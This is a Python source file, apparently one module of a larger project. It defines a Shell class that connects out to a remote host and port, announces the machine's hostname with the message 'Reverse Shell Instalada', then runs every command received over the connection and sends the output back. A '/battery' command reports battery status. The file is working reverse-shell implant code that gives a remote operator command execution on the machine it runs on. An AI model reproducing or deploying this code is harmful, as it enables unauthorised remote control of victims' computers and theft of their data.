from core.connection import Connection
from core.executor import CommandExecutor
from config.settings import BUFFER_SIZE
from modules.baterry import battery_status
from utils.colors import info

class Shell:
    def __init__(self, host, port):
        self.conn = Connection(host, port)
        self.exec = CommandExecutor()

    def start(self):
        hostname = self.conn.connect()
        self.conn.send(info(f"HOST > {hostname}\n"))
        self.conn.send(info("Reverse Shell Instalada\n"))

    def listen(self):
        while True:
            cmd = self.conn.recv(BUFFER_SIZE)
            if not cmd or cmd == "/exit":
                return
            if cmd == "/battery":
                battery_status()
            self.conn.send(self.exec.run(cmd) + b"\n")
